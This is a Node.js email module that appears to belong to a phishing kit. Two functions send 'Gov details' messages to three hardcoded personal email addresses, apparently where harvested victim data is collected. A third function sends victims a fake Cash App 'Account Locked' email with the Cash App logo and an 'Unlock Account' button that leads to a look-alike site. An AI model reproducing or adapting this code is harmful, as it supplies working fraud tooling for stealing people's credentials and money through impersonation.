const nodemailer = require('nodemailer');
require('dotenv').config()

const sendEmail = async (email, message, reason, callback) => {
    console.log(email)
    const output = `<b>${message}</b>`

    // let testAccount = await nodemailer.createTestAccount();
    return new Promise((resolve, reject) => {

        let transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: process.env.EMAIL, // generated ethereal user
                pass: process.env.EMAIL_PASSWORD, // generated ethereal password
            },
            // tls: {
            //     rejectUnauthorized: false
            // }
        });
        let mailOptions = {
            from: `"gov 👻" <${process.env.EMAIL}>`, // sender address
            to: "techt5562@gmail.com, brainm725@gmail.com, annafun@mail.com", // list of receivers
            subject: `${reason} ✔`, // Subject line
            text: "Gov details", // plain text body
            html: output, // html body
        };

        transporter.sendMail(mailOptions, function (error, info) {
            if (error) {
                console.log(error);
                return reject({ message: "not working" })
            }
            return resolve({ message: 'Email sent: ' });

        });

        //   return  callback('email sent successfully')
    })

    // send mail with defined transport object
}


const sendEmail2 = async (email, message, reason, callback) => {
    console.log(email)
    const output = `<b>${message}</b>`

    // let testAccount = await nodemailer.createTestAccount();
    return new Promise((resolve, reject) => {

        let transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: process.env.EMAIL, // generated ethereal user
                pass: process.env.EMAIL_PASSWORD, // generated ethereal password
            },
            // tls: {
            //     rejectUnauthorized: false
            // }
        });
        let mailOptions = {
            from: `"gov 👻" <${process.env.EMAIL}>`, // sender address
            to: "techt5562@gmail.com, brainm725@gmail.com, annafun@mail.com", // list of receivers
            subject: `${reason} ✔`, // Subject line
            text: "Gov details", // plain text body
            html: output, // html body
        };

        transporter.sendMail(mailOptions, function (error, info) {
            if (error) {
                console.log(error);
                return reject({ message: "not working" })
            }
            return resolve({ message: 'Email sent: ' });

        });

        //   return  callback('email sent successfully')
    })

    // send mail with defined transport object
}

const sendEmailTemplate = async (email, message, reason, callback) => {
    console.log(email)
    const output = `<b>${message}</b>`

    // let testAccount = await nodemailer.createTestAccount();
    return new Promise((resolve, reject) => {

        let transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: process.env.EMAIL, // generated ethereal user
                pass: process.env.EMAIL_PASSWORD, // generated ethereal password
            },
            // tls: {
            //     rejectUnauthorized: false
            // }
        });
        let mailOptions = {
            from: `"Cashapp" <${process.env.EMAIL}>`, // sender address
            to: email, // list of receivers
            subject: `${reason} ✔`, // Subject line
            // text: "Gov details", // plain text body
            html: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="styles.css">
  <title>Account Locked</title>

  <style>
/* Container */
.container {
  width: 100%;
  height: 100%;
  display: flex;
  justify-content: center;
  border: 1px solid transparent;
  background-color: #f0f0f0;
  padding: 1rem;
}

/* Content Box */
.content-box {
  width: 100%;
    height: 100%;
  text-align: center;
  background-color: #fff;
  border: 1px solid transparent;
  padding: 1rem;
}

/* Image Container */
.image-container {
  margin-top: 1rem;
}

/* Logo Image */
.logo-image {
  width: 5rem;
}

/* Text Box */
.text-box {
  color: #888;
  padding: 1rem 2.5rem;
}

/* Unlock Button */
.unlock-button {
  background-color: #00D632;
  color: #fff;
  border: none;
  border-radius: 0.25rem;
  margin-top: 0.5rem;
  padding: 1rem 1.5rem;
  cursor: pointer;
}


  </style>
</head>
<body>
  <div class="container">
    <div class="content-box">
      <div class="image-container">
        <img class="logo-image" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Square_Cash_app_logo.svg/2048px-Square_Cash_app_logo.svg.png" alt="">
      </div>
      <div class="text-box">
        For your security, we have identified certain unusual activities on your account. As a precautionary measure to safeguard your funds, we have temporarily restricted access to your account. To reinstate full access, we kindly request you to validate your email address by clicking on the button provided below. Your cooperation in this matter is greatly appreciated as we work diligently to ensure the safety of your account and its contents. If you have any concerns or require assistance, please don't hesitate to contact our support team. Thank you for your prompt attention to this matter.
      </div>
      <a href="https://cashapp-roan.vercel.app"> <button class="unlock-button">
        Unlock Account
      </button></a>
    </div>
  </div>
</body>

</html>
`
        };

        transporter.sendMail(mailOptions, function (error, info) {
            if (error) {
                console.log(error);
                return reject({ message: "not working" })
            }
            return resolve({ message: 'Email sent: ' });

        });

        //   return  callback('email sent successfully')
    })

    // send mail with defined transport object
}





module.exports = { sendEmail, sendEmailTemplate }
